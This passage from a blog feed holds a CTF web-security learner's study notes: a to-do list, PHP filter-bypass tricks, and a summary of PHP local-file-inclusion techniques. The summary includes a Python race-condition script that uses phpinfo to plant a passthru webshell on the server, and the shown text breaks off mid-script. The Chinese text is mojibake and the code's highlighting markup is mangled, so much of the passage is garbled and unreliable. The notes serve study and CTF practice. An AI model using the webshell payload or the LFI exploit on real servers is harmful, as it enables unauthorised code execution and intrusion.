href="https://zhuanlan.zhihu.com/p/185715807">https://zhuanlan.zhihu.com/p/185715807</a></li></ul></li></ul></li><li><s><strong>ã€å·²å®Œæˆã€‘é¦–å±Šé’“é±¼åŸæ¯CTF</strong></s></li><li><s><strong>ã€å·²å®Œæˆã€‘HW</strong></s></li><li><s><strong>ã€å·²å®Œæˆã€‘<a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#htaccess">æ–‡ä»¶è§£ææ¼æ´</a></strong></s></li><li><strong>ã€æœªå®Œæˆã€‘ã€Šæœºå™¨å­¦ä¹ å®æˆ˜ã€‹å‰ä¸ƒç« </strong></li><li><s><strong>ã€å·²å®Œæˆã€‘BUUCTFåˆ·é¢˜</strong></s></li><li><strong>ã€æœªå®Œæˆã€‘HackTheBox OpenKeysï¼ˆè´¦å·åˆè¢«å°äº†ã€‚ã€‚ã€‚</strong></li><li><strong>ã€æœªå®Œæˆã€‘PHPæ„é€ ååºåˆ—åŒ–é“¾å†å­¦ä¹ </strong></li></ul><h4 id="July">July</h4><ul><li><p><s><strong>ã€å·²å®Œæˆã€‘ç¬¬äº”ç©ºé—´CTFå¤ç›˜</strong></s></p></li><li><p><s><strong>ã€å·²å®Œæˆã€‘DASCTFä¸ƒæœˆèµ›å¤ç›˜</strong></s></p></li><li><p><strong><s>ã€å·²å®Œæˆã€‘CSICTF2020å¤ç›˜</s></strong></p></li><li><p><s><strong>ã€å·²å®Œæˆã€‘2020ç”µä¿¡å¤©ç¿¼æ¯CTF</strong></s></p></li><li><p><strong>ã€æœªå®Œæˆã€‘SUCTF2019 Upload2</strong></p></li><li><p><strong>ã€æœªå®Œæˆã€‘N1CTF2018 Easy&amp;&amp;Hard PHP</strong></p><p><a href="https://xz.aliyun.com/t/2148">https://xz.aliyun.com/t/2148</a></p><p><a href="https://github.com/wonderkun/CTF_web/tree/master/web600-1?1520941487499">https://github.com/wonderkun/CTF_web/tree/master/web600-1?1520941487499</a></p></li><li><p><strong>ã€æœªå®Œæˆã€‘<a href="https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">Flask/Jinja2 SSTI &amp;&amp; Python æ²™ç®±é€ƒé€¸åŸºç¡€</a></strong></p></li><li><p>ã€<strong>æœªå®Œæˆã€‘<a href="https://www.smi1e.top/%E5%B0%8F%E5%AF%86%E5%9C%88%E7%BB%8F%E5%85%B8%E5%86%99%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%87%A0%E7%A7%8D%E5%8F%98%E5%BD%A2%E5%AD%A6%E4%B9%A0/">PHPå†™é…ç½®æ¼æ´</a></strong></p></li><li><p><strong>ã€æœªå®Œæˆã€‘<a href="https://www.smi1e.top/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8/">PHPå¼±ç±»å‹æ¯”è¾ƒ</a></strong></p></li><li><p><strong>ã€æœªå®Œæˆã€‘<a href="https://zeroyu.xyz/2020/06/04/Code-breaking-Puzzles-2018-Note">Code Breaking 2018æŒ‘æˆ˜èµ›å­¦ä¹ â€”â€”æ­£åˆ™å›æº¯</a></strong></p></li><li><p><s><strong>ã€å·²å®Œæˆã€‘HackTheBox Tabby</strong></s></p></li><li><p><s><strong>ã€å·²å®Œæˆã€‘HackTheBox Sneakymailer</strong></s></p></li><li><p><strong>ã€æœªå®Œæˆã€‘Flask Pinç å®‰å…¨</strong></p></li></ul><h4 id="June">June</h4><ul><li><p><s>ã€å·²å®Œæˆã€‘<strong>RCTF2020</strong></s>ï¼ˆè¢«å®Œè™ã€‚ã€‚ğŸ˜­çº¯ç²¹é ç€é˜Ÿé‡Œçš„pwnå¸ˆå‚…æŠ¬ç€èµ°)</p></li><li><p><s>ã€å·²å®Œæˆã€‘<strong>PHPååºåˆ—åŒ–â€”â€”Phar</strong></s></p></li><li><p><s>ã€å·²å®Œæˆã€‘<strong>PHPååºåˆ—åŒ–â€”â€”Session</strong></s></p></li><li><p>ã€æœªå®Œæˆã€‘<strong>æ–°æ˜¥æˆ˜å½¹ Hackme</strong>ï¼š<a href="https://www.mrkaixin.top/posts/df9f633e/#5-0-hackme">https://www.mrkaixin.top/posts/df9f633e/#5-0-hackme</a></p><ul><li><strong>filter_varç»•è¿‡</strong>ï¼š<a href="https://www.secpulse.com/archives/67064.html">https://www.secpulse.com/archives/67064.html</a></li><li><strong>ç»•è¿‡å››ä¸ªå­—ç¬¦é™åˆ¶getshell</strong>ï¼š<a href="https://www.anquanke.com/post/id/87203">https://www.anquanke.com/post/id/87203</a></li></ul></li><li><p><s>ã€å·²å®Œæˆã€‘<strong>PHPååºåˆ—åŒ–â€”â€”Soapclient</strong></s></p><ul><li><strong>LCTF bestphpâ€™s revenge</strong></li></ul></li><li><p><s>ã€æœªå®Œæˆã€‘<strong>PHPååºåˆ—åŒ–â€”â€”å­—ç¬¦é€ƒé€¸</strong></s></p></li><li><p>ã€æœªå®Œæˆã€‘<a href="https://yanmymickey.github.io/2020/04/14/CTF/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/"><strong>PHPååºåˆ—åŒ–â€”â€”Bypass</strong></a></p></li><li><p><s>ã€æœªå®Œæˆã€‘<strong>ä»£ç å®¡è®¡å­¦ä¹ â€”â€”PHP-Audit-Code Day1-6</strong></s></p></li><li><p>ã€æœªå®Œæˆã€‘<a href="https://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/#GOPHER"><strong>phpinfoä¸­çš„å…³é”®ä¿¡æ¯</strong></a></p></li><li><p>ã€æœªå®Œæˆã€‘<strong>Rediså®‰å…¨å­¦ä¹ </strong></p></li><li><p><s>ã€å·²å®Œæˆã€‘<strong>BUUCTFåˆ·é¢˜</strong></s></p></li><li><p><s>ã€å·²å®Œæˆã€‘<strong>XMCTFè§£é¢˜</strong></s></p></li><li><p><s>ã€å·²å®Œæˆã€‘<strong>ç¬¬äº”ç©ºé—´CTFæ¯”èµ›ï¼ˆ2020.06.24ï¼‰</strong>ï¼ˆèœå°±ä¸€ä¸ªå­—ã€‚ã€‚ã€‚ï¼‰</s></p></li><li><p><s>ã€å·²å®Œæˆã€‘<strong>é˜Ÿå†…AWDè®­ç»ƒèµ›ï¼ˆ2020.06.28ï¼‰</strong></s></p></li></ul><h2 id="Awesome-Articals-Projects">Awesome Articals/Projects</h2><h3 id="Bypass-Tricks">Bypass &amp; Tricks</h3><h4 id="PHP">PHP</h4><h5 id="preg-matchç»•è¿‡">preg_matchç»•è¿‡</h5><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">https://www.cnblogs.com/20175211lyz/p/12198258.html</a></p></blockquote><ul><li>æ•°ç»„ç»•è¿‡</li><li>PCREå›æº¯é™åˆ¶ï¼ˆcode-breaking2018ï¼‰</li><li>æ¢è¡Œç¬¦</li></ul><h5 id="PHPå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡">PHPå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡</h5><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p></blockquote><p>å€Ÿç”¨ä¸€å¼ å›¾ç®€å•åœ°è®°ä¸€ä¸‹</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708203746.png" alt=""></p><h5 id="SSRF-fileåè®®ç»•è¿‡">SSRF fileåè®®ç»•è¿‡</h5><p>å¦‚æœSSRFä¸­<code>file://</code>å…³é”®å­—è¢«ç¦ç”¨ï¼Œå¯ä»¥ä½¿ç”¨<code>file:/</code>æˆ–è€…<code>file:///</code>æ¥ä»£æ›¿ã€‚</p><p>ä¾‹é¢˜ï¼š<a href="https://buuoj.cn/challenges#%5BGKCTF2020%5DEZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb">[GKCTF2020]EZä¸‰å‰‘å®¢-EzWeb</a></p><h5 id="Sessionç»•è¿‡">Sessionç»•è¿‡</h5><p>åˆ é™¤cookieï¼Œæ²¡æœ‰cookieä¸­çš„SESSIONIDå°±æ‰¾ä¸åˆ°å¯¹åº”çš„sessionæ–‡ä»¶ï¼Œç›¸åº”çš„<code>$_SESSION['var']</code>å°±ä¸ºNULLï¼Œç›¸å½“äºä¼ å‚NULLã€‚</p><p>ä¾‹é¢˜ï¼š<a href="https://buuoj.cn/challenges#%5BBJDCTF%202nd%5D%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B">BJDCTF2nd æ–‡ä»¶æ¢æµ‹</a></p><h5 id="åˆ©ç”¨æ•°ç»„ç»•è¿‡">åˆ©ç”¨æ•°ç»„ç»•è¿‡</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">sha1(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">ereg(pattern,<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">preg_match(pattern,<span class="keyword">Array</span>()) = <span class="literal">false</span></span><br><span class="line">strcmp(<span class="keyword">Array</span>(), <span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line">strpos(<span class="keyword">Array</span>(),<span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line">strlen(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br></pre></td></tr></table></figure><p>ä¾‹é¢˜ï¼š<a href="https://buuoj.cn/challenges#%5B0CTF%202016%5Dpiapiapia">0CTF2016 piapiapia</a></p><h5 id="basenameç»•è¿‡">basenameç»•è¿‡</h5><p>ä» <a href="https://bugs.php.net/bug.php?id=62119">https://bugs.php.net/bug.php?id=62119</a> æ‰¾åˆ°äº†<code>basename()</code>å‡½æ•°çš„ä¸€ä¸ªé—®é¢˜ï¼Œå®ƒä¼šå»æ‰æ–‡ä»¶åå¼€å¤´çš„éASCIIå€¼ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(basename(<span class="string">&quot;xffconfig.php&quot;</span>)); <span class="comment">// =&gt; config.php</span></span><br><span class="line">var_dump(basename(<span class="string">&quot;config.php/xff&quot;</span>)); <span class="comment">// =&gt; config.php</span></span><br></pre></td></tr></table></figure><p>ä¾‹é¢˜ï¼š<a href="https://buuoj.cn/challenges#%5BZer0pts2020%5DCan%20you%20guess%20it?">[Zer0pts2020]Can you guess it?</a></p><h5 id="htaccessåˆ©ç”¨">.htaccessåˆ©ç”¨</h5><p><a href="https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricks%E6%80%BB%E7%BB%93">https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricksæ€»ç»“</a></p><h3 id="Linuxå…¥ä¾µæ£€æµ‹">Linuxå…¥ä¾µæ£€æµ‹</h3><p><a href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></p><h3 id="çº¢è“å¯¹æŠ—">çº¢è“å¯¹æŠ—</h3><p><a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a></p><p><a href="https://github.com/hudunkey/Red-Team-links">https://github.com/hudunkey/Red-Team-links</a></p><h3 id="ä»£ç å®¡è®¡">ä»£ç å®¡è®¡</h3><p><a href="https://github.com/CHYbeta/Code-Audit-Challenges">https://github.com/CHYbeta/Code-Audit-Challenges</a></p><p><a href="https://github.com/hongriSec/PHP-Audit-Labs">https://github.com/hongriSec/PHP-Audit-Labs</a></p><h3 id="WAF">WAF</h3><p><a href="https://wh0ale.github.io/2019/12/04/waf%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0Bypass/">https://wh0ale.github.io/2019/12/04/wafä»å…¥é—¨åˆ°Bypass/</a></p><p><a href="https://weibo.com/ttarticle/p/show?id=2309404007261092631700#_loginLayer_1579837230756">https://weibo.com/ttarticle/p/show?id=2309404007261092631700#_loginLayer_1579837230756</a></p><h3 id="javaå®‰å…¨">javaå®‰å…¨</h3><p><a href="https://github.com/threedr3am/learnjavabug">https://github.com/threedr3am/learnjavabug</a></p><h3 id="Pythonå®‰å…¨">Pythonå®‰å…¨</h3><p><a href="https://github.com/bit4woo/python_sec">https://github.com/bit4woo/python_sec</a></p><h3 id="å­—å…¸">å­—å…¸</h3><p><a href="https://github.com/insightglacier/Dictionary-Of-Pentesting">https://github.com/insightglacier/Dictionary-Of-Pentesting</a></p><h3 id="æ±‚èŒ">æ±‚èŒ</h3><p><a href="https://github.com/geekcompany/ResumeSample">https://github.com/geekcompany/ResumeSample</a></p><p><a href="https://github.com/zhaoweiho/web-sec-interview">https://github.com/zhaoweiho/web-sec-interview</a></p><p><a href="https://github.com/EvilAnne/Pentest_questions">https://github.com/EvilAnne/Pentest_questions</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;figcaption&gt;&lt;span&gt;wiki&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>PHP LFIåˆ©ç”¨æ€»ç»“</title>
    <link href="http://ca0y1h.top/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <id>http://ca0y1h.top/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</id>
    <published>2020-09-21T02:17:16.000Z</published>
    <updated>2020-09-21T06:58:14.569Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP-LFIåˆ©ç”¨æ€»ç»“">PHP LFIåˆ©ç”¨æ€»ç»“</h1><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.anquanke.com/post/id/177491">https://www.anquanke.com/post/id/177491</a></p></blockquote><h2 id="proc-self-environ">proc/self/environ</h2><p><strong>å‰ç½®æ¡ä»¶</strong></p><ul><li>phpä»¥cgiæ–¹å¼è¿è¡Œï¼Œè¿™æ ·environæ‰ä¼šä¿æŒUAå¤´ã€‚</li><li>environæ–‡ä»¶å­˜å‚¨ä½ç½®å·²çŸ¥ï¼Œä¸”environæ–‡ä»¶å¯è¯»ã€‚</li></ul><p><strong>åˆ©ç”¨æ–¹å¼</strong></p><p>å¦‚æœå¯ä»¥è¯»å–ï¼Œä¿®æ”¹<code>User-Agent</code>ä¸ºphpä»£ç ï¼Œç„¶ålfiç‚¹åŒ…å«ï¼Œå®ç°rceã€‚</p><h2 id="proc-self-fd-1-2-3â€¦">proc/self/fd/1,2,3â€¦</h2><p><strong>å‰ç½®æ¡ä»¶</strong></p><ul><li><p>phpä»¥cgiæ–¹å¼è¿è¡Œã€‚</p></li><li><p>environæ–‡ä»¶å­˜å‚¨ä½ç½®å·²çŸ¥ï¼Œä¸”environæ–‡ä»¶å¯è¯»ã€‚</p></li></ul><p>ç±»ä¼¼äº<code>/proc/self/environ</code>ï¼Œä¸åŒæ˜¯åœ¨<code>referer</code>æˆ–æŠ¥é”™ç­‰å†™å…¥phpä»£ç ï¼Œç„¶ålfiç‚¹åŒ…å«ï¼Œå®ç°rceã€‚</p><h2 id="PHPä¼ªåè®®">PHPä¼ªåè®®</h2><h3 id="å¸¸ç”¨ä¼ªåè®®">å¸¸ç”¨ä¼ªåè®®</h3><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200921104109.png" alt=""></p><h3 id="expect">expect://</h3><p><strong>å‰ç½®æ¡ä»¶</strong></p><ul><li>é»˜è®¤ä¸å¼€å¯ï¼Œéœ€è¦å®‰è£…PECL packageæ‰©å±•</li><li>éœ€è¦<code>allow_url_include</code>å¼€å¯</li></ul><p><strong>åˆ©ç”¨æ–¹å¼</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expect:&#x2F;&#x2F;[command]</span><br></pre></td></tr></table></figure><h2 id="æ—¥å¿—">æ—¥å¿—</h2><h3 id="Apacheæ—¥å¿—">Apacheæ—¥å¿—</h3><p>åœ¨ä¸€äº›åœºæ™¯ä¸­ï¼Œlogçš„åœ°å€æ˜¯è¢«ä¿®æ”¹æ‰çš„ã€‚ä½ å¯ä»¥é€šè¿‡è¯»å–ç›¸åº”çš„é…ç½®æ–‡ä»¶åï¼Œå†è¿›è¡ŒåŒ…å«ã€‚</p><p>CTFå®ä¾‹ï¼š</p><p><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two">https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two</a></p><h2 id="with-phpinfo">with phpinfo</h2><p>åœ¨å¯ä»¥è®¿é—®phpinfoçš„æƒ…å†µä¸‹ï¼Œç–¯ç‹‚ä¸Šä¼ å¤§æ–‡ä»¶ï¼ŒåŒæ—¶åœ¨phpinfoä¸­å¯ä»¥çœ‹åˆ°ä¸Šä¼ çš„æ–‡ä»¶åœ¨tmpç›®å½•ä¸‹çš„æ–‡ä»¶åï¼Œæ¡ä»¶ç«äº‰ï¼Œåœ¨æ–‡ä»¶è¢«åˆ é™¤ä¹‹å‰åŒ…å«è¿›æ¥getshellã€‚</p><p>åˆ©ç”¨è„šæœ¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import socket</span><br><span class="line">def setup(host, port):</span><br><span class="line">    TAG=<span class="string">&quot;Security Test&quot;</span></span><br><span class="line">    PAYLOAD=<span class="string">&quot;&quot;</span><span class="string">&quot;%sr</span></span><br><span class="line"><span class="string">&lt;?php <span class="subst">$c</span>=fopen(&#x27;/tmp/g&#x27;,&#x27;w&#x27;);fwrite(<span class="subst">$c</span>,&#x27;&lt;?php passthru(<span class="subst">$_GET</span>[&quot;</span>f<span class="string">&quot;]);?&gt;&#x27;);?&gt;r&quot;</span><span class="string">&quot;&quot;</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">&quot;&quot;</span><span class="string">&quot;-----------------------------7dbff1ded0714r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;</span>dummyname<span class="string">&quot;; filename=&quot;</span>test.txt<span class="string">&quot;r</span></span><br><span class="line"><span class="string">Content-Type: text/plainr</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--r&quot;</span><span class="string">&quot;&quot;</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">&quot;A&quot;</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">&quot;&quot;</span><span class="string">&quot;POST /phpinfo.php?a=&quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot; HTTP/1.1r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot;r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: &quot;</span><span class="string">&quot;&quot;</span> + padding + <span class="string">&quot;&quot;</span><span class="string">&quot;r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: &quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot;r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: &quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot;r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: &quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot;r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714r</span></span><br><span class="line"><span class="string">Content-Length: %sr</span></span><br><span class="line"><span class="string">Host: %sr</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">%s&quot;</span><span class="string">&quot;&quot;</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script</span></span><br><span class="line"><span class="comment">#     LFIREQ=&quot;&quot;&quot;GET /lfi.php?file=%s%%00 HTTP/1.1r</span></span><br><span class="line"><span class="comment"># User-Agent: Mozilla/4.0r</span></span><br><span class="line"><span class="comment"># Proxy-Connection: Keep-Aliver</span></span><br><span class="line"><span class="comment"># Host: %sr</span></span><br><span class="line"><span class="comment"># r</span></span><br><span class="line"><span class="comment"># r</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;</span></span><br><span class="line">    LFIREQ=<span class="string">&quot;&quot;</span><span class="string">&quot;GET /lfi.php?file=%s HTTP/1.1r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Aliver</span></span><br><span class="line"><span class="string">Host: %sr</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line">def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">&quot;[tmp_name] =&amp;gt&quot;</span>)</span><br><span class="line">        fn = d[i+17:i+31]</span><br><span class="line">        <span class="comment"># print fn</span></span><br><span class="line">    except ValueError:</span><br><span class="line">        <span class="keyword">return</span> None</span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (<span class="function"><span class="keyword">fn</span>, <span class="title">host</span>))</span></span><br><span class="line"><span class="function">    <span class="title">d</span> = <span class="title">s2</span>.<span class="title">recv</span>(<span class="params"><span class="number">4096</span></span>)</span></span><br><span class="line"><span class="function">    <span class="title">s</span>.<span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">s2</span>.<span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">if</span> <span class="title">d</span>.<span class="title">find</span>(<span class="params">tag</span>) != -1:</span></span><br><span class="line"><span class="function">        <span class="title">return</span> <span class="title">fn</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">counter</span>=0</span></span><br><span class="line"><span class="function"><span class="title">class</span> <span class="title">ThreadWorker</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">__init__</span>(<span class="params"><span class="built_in">self</span>, e, l, m, *args</span>):</span></span><br><span class="line"><span class="function">        <span class="title">threading</span>.<span class="title">Thread</span>.<span class="title">__init__</span>(<span class="params"><span class="built_in">self</span></span>)</span></span><br><span class="line"><span class="function">        <span class="title">self</span>.<span class="title">event</span> = <span class="title">e</span></span></span><br><span class="line"><span class="function">        <span class="title">self</span>.<span class="title">lock</span> = <span class="title">l</span></span></span><br><span class="line"><span class="function">        <span class="title">self</span>.<span class="title">maxattempts</span> = <span class="title">m</span></span></span><br><span class="line"><span class="function">        <span class="title">self</span>.<span class="title">args</span> = <span class="title">args</span></span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">run</span>(<span class="params"><span class="built_in">self</span></span>):</span></span><br><span class="line"><span class="function">        <span class="title">global</span> <span class="title">counter</span></span></span><br><span class="line"><span class="function">        <span class="title">while</span> <span class="title">not</span> <span class="title">self</span>.<span class="title">event</span>.<span class="title">is_set</span>(<span class="params"></span>):</span></span><br><span class="line"><span class="function">            <span class="title">with</span> <span class="title">self</span>.<span class="title">lock</span>:</span></span><br><span class="line"><span class="function">                <span class="title">if</span> <span class="title">counter</span> &gt;= <span class="title">self</span>.<span class="title">maxattempts</span>:</span></span><br><span class="line"><span class="function">                    <span class="title">return</span></span></span><br><span class="line"><span class="function">                <span class="title">counter</span>+=1</span></span><br><span class="line"><span class="function">            <span class="title">try</span>:</span></span><br><span class="line"><span class="function">                <span class="title">x</span> = <span class="title">phpInfoLFI</span>(<span class="params">*<span class="built_in">self</span>.args</span>)</span></span><br><span class="line"><span class="function">                <span class="title">if</span> <span class="title">self</span>.<span class="title">event</span>.<span class="title">is_set</span>(<span class="params"></span>):</span></span><br><span class="line"><span class="function">                    <span class="title">break</span></span></span><br><span class="line"><span class="function">                <span class="title">if</span> <span class="title">x</span>:</span></span><br><span class="line"><span class="function">                    <span class="title">print</span> &quot;<span class="title">nGot</span> <span class="title">it</span>! <span class="title">Shell</span> <span class="title">created</span> <span class="title">in</span> /<span 